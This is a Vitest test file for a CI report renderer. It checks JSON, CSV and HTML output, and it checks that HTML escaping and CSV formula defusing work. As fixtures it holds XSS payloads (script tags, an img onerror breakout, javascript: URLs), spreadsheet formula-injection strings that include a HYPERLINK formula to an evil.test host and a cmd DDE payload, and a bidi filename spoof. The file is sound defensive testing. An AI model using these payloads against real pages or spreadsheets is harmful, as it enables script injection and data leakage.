import { describe, expect, it } from "vitest";

import type { BudgetViolation, CiPage, CiReport } from "@/lib/ci/types";
import {
  CI_CSV_COLUMNS,
  describeViolation,
  escapeHtml,
  MAX_ERROR_CHARS,
  MAX_URL_CHARS,
  renderCiReport,
} from "@/lib/ci/reporters";
import type { CoreWebVitals } from "@/lib/lighthouse/types";

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                    */
/* -------------------------------------------------------------------------- */

function metrics(): CoreWebVitals {
  return {
    "largest-contentful-paint": { numericValue: 2400, displayValue: "2.4 s", score: 0.7 },
    "cumulative-layout-shift": { numericValue: 0.02, displayValue: "0.02", score: 0.99 },
    "total-blocking-time": { numericValue: 180, displayValue: "180 ms", score: 0.8 },
    "first-contentful-paint": { numericValue: 1100, displayValue: "1.1 s", score: 0.9 },
    "speed-index": { numericValue: 2600, displayValue: "2.6 s", score: 0.8 },
    interactive: null,
  };
}

function violation(overrides: Partial<BudgetViolation> = {}): BudgetViolation {
  return {
    url: "https://example.com/",
    runId: "run-1",
    formFactor: "mobile",
    category: "performance",
    score: 62,
    budget: 90,
    reason: "below",
    ...overrides,
  };
}

function page(overrides: Partial<CiPage> = {}): CiPage {
  return {
    runId: "run-1",
    url: "https://example.com/",
    finalUrl: "https://example.com/home",
    formFactor: "mobile",
    status: "done",
    errorMessage: null,
    scores: {
      performance: 62,
      accessibility: 94,
      "best-practices": 83,
      seo: 100,
      "agentic-browsing": 40,
    },
    metrics: metrics(),
    violations: [violation()],
    ...overrides,
  };
}

function report(overrides: Partial<CiReport> = {}): CiReport {
  const pages = overrides.pages ?? [page()];
  const violations = overrides.violations ?? pages.flatMap((p) => p.violations);
  return {
    ok: violations.length === 0,
    batchId: "batch-abc",
    budgets: { performance: 90, seo: 80 },
    pages,
    violations,
    totals: {
      pages: pages.length,
      passed: pages.filter((p) => p.violations.length === 0).length,
      failed: pages.filter((p) => p.violations.length > 0).length,
      errored: pages.filter((p) => p.status === "error").length,
    },
    startedAt: "2026-09-06T10:00:00.000Z",
    finishedAt: "2026-09-06T10:01:30.000Z",
    ...overrides,
  };
}

/** Parse a CSV document into header + rows, honouring RFC 4180 quoting. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (quoted) {
      if (char === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else {
          quoted = false;
        }
      } else {
        cell += char;
      }
    } else if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      row.push(cell);
      cell = "";
    } else if (char === "\r" && text[i + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      i += 1;
    } else {
      cell += char;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

/**
 * Every distinct tag name in a document, sorted.
 *
 * The XSS assertion below compares this against a fixed vocabulary rather than
 * grepping for payload substrings. An escaped payload legitimately *contains*
 * the string `onerror=`; what must never happen is that it becomes an element.
 */
function tagsIn(html: string): string[] {
  const names = new Set<string>();
  for (const [, name] of html.matchAll(/<\/?([a-zA-Z][^\s>/]*)/g)) {
    names.add(name.toLowerCase());
  }
  return [...names].sort();
}

/** The complete tag vocabulary the HTML reporter emits. No script, img, or a. */
const REPORTER_TAGS = [
  "abbr",
  "body",
  "caption",
  "div",
  "footer",
  "h2",
  "head",
  "header",
  "html",
  "li",
  "main",
  "meta",
  "p",
  "section",
  "span",
  "style",
  "table",
  "tbody",
  "td",
  "th",
  "thead",
  "title",
  "tr",
  "ul",
];

/* -------------------------------------------------------------------------- */
/* All four formats                                                            */
/* -------------------------------------------------------------------------- */

describe("renderCiReport", () => {
  it("renders every format as a non-empty string", () => {
    for (const format of ["json", "jsonExpanded", "csv", "html"] as const) {
      const output = renderCiReport(report(), format);
      expect(typeof output).toBe("string");
      expect(output.length).toBeGreaterThan(0);
    }
  });

  it("is deterministic — the same report renders byte-identically", () => {
    for (const format of ["json", "jsonExpanded", "csv", "html"] as const) {
      const source = report();
      expect(renderCiReport(source, format)).toBe(renderCiReport(source, format));
    }
  });

  it("orders scores canonically regardless of the input's key order", () => {
    const shuffled = page({
      scores: {
        seo: 100,
        performance: 62,
        "agentic-browsing": 40,
        accessibility: 94,
        "best-practices": 83,
      },
    });
    expect(renderCiReport(report({ pages: [shuffled] }), "json")).toBe(
      renderCiReport(report(), "json"),
    );
  });

  it("renders a report with zero pages", () => {
    const empty = report({ pages: [], violations: [] });
    const json = JSON.parse(renderCiReport(empty, "json"));
    expect(json.pages).toEqual([]);
    expect(json.ok).toBe(true);

    // The CSV is still a valid document: a header row and nothing else.
    const csv = renderCiReport(empty, "csv");
    expect(csv).toBe(CI_CSV_COLUMNS.join(","));

    const html = renderCiReport(empty, "html");
    expect(html).toContain("No pages were audited.");
    expect(html).toContain("PASS");
  });

  it("renders a passing report with zero violations", () => {
    const clean = report({ pages: [page({ violations: [] })] });
    expect(clean.ok).toBe(true);

    expect(JSON.parse(renderCiReport(clean, "json")).violations).toEqual([]);

    const [, row] = parseCsv(renderCiReport(clean, "csv"));
    expect(row[CI_CSV_COLUMNS.indexOf("passed")]).toBe("true");
    expect(row[CI_CSV_COLUMNS.indexOf("violations")]).toBe("");

    const html = renderCiReport(clean, "html");
    // The markup, not the stylesheet — which necessarily defines both classes.
    expect(html).toContain('<div class="verdict verdict--pass">');
    expect(html).not.toContain('<div class="verdict verdict--fail">');
    expect(html).toContain("met every budget");
  });

  it("renders a report with no budgets at all", () => {
    const unjudged = report({ budgets: {}, pages: [page({ violations: [] })] });
    expect(JSON.parse(renderCiReport(unjudged, "json")).budgets).toEqual({});
    expect(renderCiReport(unjudged, "html")).toContain("No budgets applied");
  });
});

/* -------------------------------------------------------------------------- */
/* JSON / jsonExpanded                                                         */
/* -------------------------------------------------------------------------- */

describe("json reporters", () => {
  it("round-trips through JSON.parse", () => {
    const source = report();
    const parsed = JSON.parse(renderCiReport(source, "json"));
    expect(parsed.ok).toBe(false);
    expect(parsed.batchId).toBe("batch-abc");
    expect(parsed.totals).toEqual(source.totals);
    expect(parsed.startedAt).toBe(source.startedAt);
    expect(parsed.pages).toHaveLength(1);
    expect(parsed.pages[0].scores.performance).toBe(62);
    expect(parsed.violations).toHaveLength(1);
  });

  it("omits per-page metrics from json and includes them in jsonExpanded", () => {
    const source = report();
    const compact = JSON.parse(renderCiReport(source, "json"));
    const expanded = JSON.parse(renderCiReport(source, "jsonExpanded"));

    expect("metrics" in compact.pages[0]).toBe(false);
    expect(expanded.pages[0].metrics["largest-contentful-paint"].numericValue).toBe(2400);
    expect(expanded.pages[0].metrics.interactive).toBeNull();
  });

  it("keeps the two JSON formats parse-compatible — metrics is the only difference", () => {
    // Both a page with metrics and one without, so the comparison covers the
    // populated and the null case in the same document.
    const source = report({
      pages: [
        page({ runId: "measured" }),
        page({ runId: "failed", status: "error", errorMessage: "NO_FCP", metrics: null }),
      ],
    });
    const compact = JSON.parse(renderCiReport(source, "json"));
    const expanded = JSON.parse(renderCiReport(source, "jsonExpanded"));

    expect(Object.keys(compact)).toEqual(Object.keys(expanded));
    expect(Object.keys(compact.pages[0])).toEqual(
      Object.keys(expanded.pages[0]).filter((key) => key !== "metrics"),
    );

    // Strip the one expected difference; everything else must be identical, so
    // one consumer parser reads either document.
    for (const page_ of expanded.pages) delete page_.metrics;
    expect(compact).toEqual(expanded);
  });

  it("distinguishes 'not in this format' from 'this run had no metrics'", () => {
    // The report always arrives fully populated — `evaluateBudgets` copies
    // `metrics` off the persisted row — so the compact/expanded split is made
    // here, at serialize time. That makes the absent-key-versus-null
    // distinction load-bearing: a failed run legitimately carries
    // `metrics: null`, and a consumer must not read that as "the compact
    // reporter dropped it".
    const source = report({
      pages: [
        page({ runId: "measured" }),
        page({ runId: "failed", status: "error", errorMessage: "NO_FCP", metrics: null }),
      ],
    });

    const compact = JSON.parse(renderCiReport(source, "json"));
    // Absent, not null — for BOTH pages, whatever they carried.
    expect("metrics" in compact.pages[0]).toBe(false);
    expect("metrics" in compact.pages[1]).toBe(false);

    const expanded = JSON.parse(renderCiReport(source, "jsonExpanded"));
    // Present for both, and the null is the run's own missing data.
    expect("metrics" in expanded.pages[0]).toBe(true);
    expect("metrics" in expanded.pages[1]).toBe(true);
    expect(expanded.pages[0].metrics["largest-contentful-paint"].numericValue).toBe(2400);
    expect(expanded.pages[1].metrics).toBeNull();
  });

  it("emits null metrics in jsonExpanded when a page carries none at all", () => {
    const source = report({ pages: [page({ metrics: undefined })] });
    const expanded = JSON.parse(renderCiReport(source, "jsonExpanded"));
    expect(expanded.pages[0].metrics).toBeNull();
  });

  it("keeps full fidelity — JSON never clamps or strips", () => {
    const longUrl = `https://evil.test/${"a".repeat(MAX_URL_CHARS * 2)}`;
    const source = report({
      pages: [page({ finalUrl: longUrl, errorMessage: "line one\nline two" })],
    });
    const parsed = JSON.parse(renderCiReport(source, "json"));
    expect(parsed.pages[0].finalUrl).toBe(longUrl);
    expect(parsed.pages[0].errorMessage).toBe("line one\nline two");
  });

  it("does not pick up inherited keys when projecting scores", () => {
    const scores = Object.create({ performance: 1 }) as Record<string, number>;
    scores.seo = 77;
    const source = report({
      pages: [page({ scores, violations: [] })],
    });
    const parsed = JSON.parse(renderCiReport(source, "json"));
    expect(parsed.pages[0].scores).toEqual({ seo: 77 });
  });
});

/* -------------------------------------------------------------------------- */
/* CSV                                                                         */
/* -------------------------------------------------------------------------- */

describe("csv reporter", () => {
  it("writes a header row and one CRLF-separated row per page", () => {
    const source = report({ pages: [page(), page({ runId: "run-2" })] });
    const csv = renderCiReport(source, "csv");
    expect(csv.split("\r\n")).toHaveLength(3);
    expect(csv).not.toContain("\n\n");

    const [header, first] = parseCsv(csv);
    expect(header).toEqual([...CI_CSV_COLUMNS]);
    expect(first[CI_CSV_COLUMNS.indexOf("url")]).toBe("https://example.com/");
    expect(first[CI_CSV_COLUMNS.indexOf("device")]).toBe("mobile");
    expect(first[CI_CSV_COLUMNS.indexOf("performance")]).toBe("62");
    expect(first[CI_CSV_COLUMNS.indexOf("passed")]).toBe("false");
    expect(first[CI_CSV_COLUMNS.indexOf("violations")]).toBe("Performance 62 < 90");
  });

  it("puts category columns in canonical order so a new category appends", () => {
    expect(CI_CSV_COLUMNS.slice(5, 10)).toEqual([
      "performance",
      "accessibility",
      "best-practices",
      "seo",
      "agentic-browsing",
    ]);
    expect(CI_CSV_COLUMNS.at(-1)).toBe("errorMessage");
  });

  it("leaves a missing score as an empty cell rather than a zero", () => {
    const source = report({ pages: [page({ scores: { performance: 62 }, violations: [] })] });
    const [, row] = parseCsv(renderCiReport(source, "csv"));
    expect(row[CI_CSV_COLUMNS.indexOf("performance")]).toBe("62");
    expect(row[CI_CSV_COLUMNS.indexOf("seo")]).toBe("");
  });

  it("escapes commas, quotes and newlines per RFC 4180", () => {
    const source = report({
      pages: [
        page({
          url: "https://example.com/a,b",
          finalUrl: 'https://example.com/"quoted"',
          errorMessage: "first line\nsecond line",
          violations: [],
        }),
      ],
    });
    const csv = renderCiReport(source, "csv");
    expect(csv).toContain('"https://example.com/a,b"');
    expect(csv).toContain('"https://example.com/""quoted"""');

    const [, row] = parseCsv(csv);
    expect(row[CI_CSV_COLUMNS.indexOf("url")]).toBe("https://example.com/a,b");
    expect(row[CI_CSV_COLUMNS.indexOf("finalUrl")]).toBe('https://example.com/"quoted"');
    expect(row[CI_CSV_COLUMNS.indexOf("errorMessage")]).toBe("first line\nsecond line");
  });

  it("defuses spreadsheet formula injection from page-controlled text", () => {
    const source = report({
      pages: [
        page({
          finalUrl: '=HYPERLINK("https://evil.test?"&A1,"click")',
          errorMessage: "@SUM(1+1)*cmd|'/c calc'!A1",
          violations: [],
        }),
      ],
    });
    const csv = renderCiReport(source, "csv");

    // Every formula-leading cell is quoted with a leading apostrophe, so a
    // spreadsheet reads it as text — and a parser still recovers the value.
    expect(csv).toContain(`"'=HYPERLINK(`);
    expect(csv).toContain(`"'@SUM(1+1)`);

    const [, row] = parseCsv(csv);
    expect(row[CI_CSV_COLUMNS.indexOf("finalUrl")]).toBe(
      '\'=HYPERLINK("https://evil.test?"&A1,"click")',
    );
  });

  it("clamps an over-long URL and error message", () => {
    const source = report({
      pages: [
        page({
          url: `https://example.com/${"a".repeat(5000)}`,
          finalUrl: `https://evil.test/${"b".repeat(5000)}`,
          errorMessage: "x".repeat(5000),
          violations: [],
        }),
      ],
    });
    const [, row] = parseCsv(renderCiReport(source, "csv"));
    expect(row[CI_CSV_COLUMNS.indexOf("url")]).toHaveLength(MAX_URL_CHARS);
    expect(row[CI_CSV_COLUMNS.indexOf("finalUrl")]).toHaveLength(MAX_URL_CHARS);
    expect(row[CI_CSV_COLUMNS.indexOf("errorMessage")]).toHaveLength(MAX_ERROR_CHARS);
    expect(row[CI_CSV_COLUMNS.indexOf("url")].endsWith("…")).toBe(true);
  });
});

/* -------------------------------------------------------------------------- */
/* HTML                                                                        */
/* -------------------------------------------------------------------------- */

describe("html reporter", () => {
  it("is a self-contained document with no external resource of any kind", () => {
    const html = renderCiReport(report(), "html");
    expect(html.startsWith("<!doctype html>")).toBe(true);
    expect(html).toContain("<style>");
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<link\b/i);
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toMatch(/https?:\/\/(?!example\.com)/);
    expect(html).toContain("default-src 'none'");
  });

  it("renders the verdict, totals, budgets and every page", () => {
    const html = renderCiReport(
      report({ pages: [page(), page({ runId: "run-2", url: "https://example.com/pricing" })] }),
      "html",
    );
    expect(html).toContain('<div class="verdict verdict--fail">');
    expect(html).toContain('<span class="verdict__word">FAIL</span>');
    expect(html).toContain("https://example.com/pricing");
    expect(html).toContain("Performance 62 &lt; 90");
    expect(html).toContain("Performance <span class=\"chip__bar\">&ge; 90</span>");
    expect(html).toContain("90s"); // duration from the two ISO stamps
  });

  it("bands each score by colour class and never by colour alone", () => {
    const html = renderCiReport(report(), "html");
    // seo 100 → good, performance 62 → average, agentic-browsing 40 → poor.
    expect(html).toContain('<div class="score band-good">100</div>');
    expect(html).toContain('<div class="score band-average">62</div>');
    expect(html).toContain('<div class="score band-poor">40</div>');
    // The gauge length is the score, and it is never the only signal.
    expect(html).toContain('style="width:62%"');
  });

  it("gives each row a result word and a colour that agree", () => {
    const html = renderCiReport(
      report({
        pages: [
          page({ runId: "r1", violations: [violation()] }),
          page({ runId: "r2", violations: [] }),
          page({ runId: "r3", status: "error", errorMessage: "NO_FCP", violations: [] }),
        ],
      }),
      "html",
    );
    // A measured page that missed a bar is "Fail" in the fail colour — not the
    // pass colour, which is what keying the class off the run status produced.
    expect(html).toContain('<span class="status status--fail">Fail</span>');
    expect(html).toContain('<span class="status status--ok">Pass</span>');
    expect(html).toContain('<span class="status status--error">Error</span>');
    expect(html).not.toContain('<span class="status status--ok">Fail</span>');
  });

  it("shows an em dash and no gauge for an unscored category", () => {
    const source = report({ pages: [page({ scores: { performance: 62 }, violations: [] })] });
    const html = renderCiReport(source, "html");
    expect(html).toContain("band-none");
    expect(html).toContain("—");
  });

  it("never emits a link, however the page URL is shaped", () => {
    const source = report({
      pages: [
        page({
          url: "https://example.com/",
          finalUrl: "javascript:alert(1)",
          violations: [],
        }),
      ],
    });
    const html = renderCiReport(source, "html");
    expect(html).not.toMatch(/<a\b/i);
    expect(html).not.toContain("href");
    // Present as escaped text, so the reader still sees where they were sent.
    expect(html).toContain("javascript:alert(1)");
  });

  it("neutralises markup, attribute-breakout and event-handler payloads", () => {
    const xss = '<script>alert(1)</script>';
    const breakout = '"><img src=x onerror=alert(1)><span class="';
    const source = report({
      pages: [
        page({
          url: `https://example.com/${breakout}`,
          finalUrl: `https://evil.test/${xss}`,
          status: "error",
          errorMessage: `${xss} ${breakout} ' onmouseover='alert(1)`,
          violations: [],
        }),
      ],
      batchId: `batch${xss}`,
    });
    const html = renderCiReport(source, "html");

    // Assert on ELEMENTS, not substrings: `onerror=alert(1)` legitimately
    // appears in the output as escaped *text*, so a `not.toContain("onerror=")`
    // would fail on a perfectly safe document while still passing on a broken
    // one that hid the payload elsewhere. What matters is that the document's
    // tag vocabulary stays within the static set this reporter emits — nothing
    // the audited site supplied became an element.
    expect(tagsIn(html).filter((tag) => !REPORTER_TAGS.includes(tag))).toEqual([]);

    // No event-handler attribute inside any tag, and no executable URL scheme.
    expect(html).not.toMatch(/<[^>]*\son[a-z]+\s*=/i);
    expect(html).not.toMatch(/<[^>]*(?:javascript|data):/i);
    expect(html).not.toMatch(/<a\b/i);

    // …and the payloads ARE on screen as escaped text, so the test cannot pass
    // by silently dropping the value (Phase D's precedent).
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).toContain("&quot;&gt;&lt;img src=x onerror=alert(1)&gt;");
    expect(html).toContain("&#39; onmouseover=&#39;alert(1)");
  });

  it("strips control and bidi characters that could forge a line", () => {
    const source = report({
      pages: [
        page({
          // An RTL override that makes `gnp.exe` read as `exe.png`, plus a
          // zero-width space. Written as escapes: literally, they vanish in a diff.
          finalUrl: `https://evil.test/\u202Egnp.exe\u200B`,
          // A newline and a NUL — the two ways to forge a second line of output.
          errorMessage: `real error\n\u0000FAKE: everything passed`,
          violations: [],
        }),
      ],
    });
    const html = renderCiReport(source, "html");
    expect(html).not.toContain("\u202E");
    expect(html).not.toContain("\u200B");
    expect(html).not.toContain("\u0000");
    // The visible text survives; only the forging characters are gone.
    expect(html).toContain("gnp.exe");
    expect(html).toContain("real errorFAKE: everything passed");
  });

  it("clamps an over-long URL and error message", () => {
    const source = report({
      pages: [
        page({
          url: `https://example.com/${"a".repeat(20_000)}`,
          errorMessage: "x".repeat(20_000),
          violations: [],
        }),
      ],
    });
    const html = renderCiReport(source, "html");
    expect(html).not.toContain("a".repeat(MAX_URL_CHARS + 1));
    expect(html).not.toContain("x".repeat(MAX_ERROR_CHARS + 1));
    expect(html.length).toBeLessThan(20_000);
  });

  it("stays linear in the page count", () => {
    const pages = Array.from({ length: 50 }, (_, i) =>
      page({ runId: `run-${i}`, url: `https://example.com/page-${i}` }),
    );
    const html = renderCiReport(report({ pages }), "html");
    expect(html).toContain("page-49");
    expect(html.length).toBeLessThan(200_000);
  });

  it("prints ISO timestamps rather than a locale-dependent format", () => {
    const html = renderCiReport(report(), "html");
    expect(html).toContain("2026-09-06T10:00:00.000Z");
    expect(html).toContain("2026-09-06T10:01:30.000Z");
  });

  it("falls back to an em dash when the timestamps cannot be differenced", () => {
    const html = renderCiReport(report({ finishedAt: "not-a-date" }), "html");
    expect(html).toContain("not-a-date");
    expect(html).toContain("—");
  });
});

/* -------------------------------------------------------------------------- */
/* Helpers                                                                     */
/* -------------------------------------------------------------------------- */

describe("escapeHtml", () => {
  it("escapes all five characters, ampersand first", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
    expect(escapeHtml("<&lt;")).toBe("&lt;&amp;lt;");
  });

  it("leaves ordinary text untouched", () => {
    expect(escapeHtml("https://example.com/a-b_c?d=1")).toBe("https://example.com/a-b_c?d=1");
  });
});

describe("describeViolation", () => {
  it("phrases each reason differently — a regression is not an unknown", () => {
    expect(describeViolation(violation())).toBe("Performance 62 < 90");
    expect(describeViolation(violation({ reason: "unscored", score: null }))).toBe(
      "Performance not scored (budget 90)",
    );
    expect(describeViolation(violation({ reason: "error", score: null }))).toBe(
      "Performance not measured — run failed (budget 90)",
    );
  });

  it("uses the category's human label", () => {
    expect(describeViolation(violation({ category: "best-practices", score: 10 }))).toBe(
      "Best Practices 10 < 90",
    );
  });
});

describe("HTML verdict wording (Phase F security re-review, L-a)", () => {
  it("says a page could not be audited rather than that it missed a budget", () => {
    // With no budgets there is nothing to miss, but an errored page still fails.
    // The two-branch version rendered "1 of 1 page missed a budget · 0
    // violations." — self-contradicting, on the artifact a human reads.
    const subject = report({
      ok: false,
      budgets: {},
      violations: [],
      totals: { pages: 1, passed: 0, failed: 1, errored: 1 },
    });
    const html = renderCiReport(subject, "html");
    expect(html).toContain("could not be audited");
    expect(html).not.toContain("missed a budget");
  });

  it("still says 'missed a budget' when a budget was actually missed", () => {
    const subject = report({ ok: false });
    const html = renderCiReport(subject, "html");
    expect(html).toContain("missed a budget");
    expect(html).not.toContain("could not be audited");
  });
});
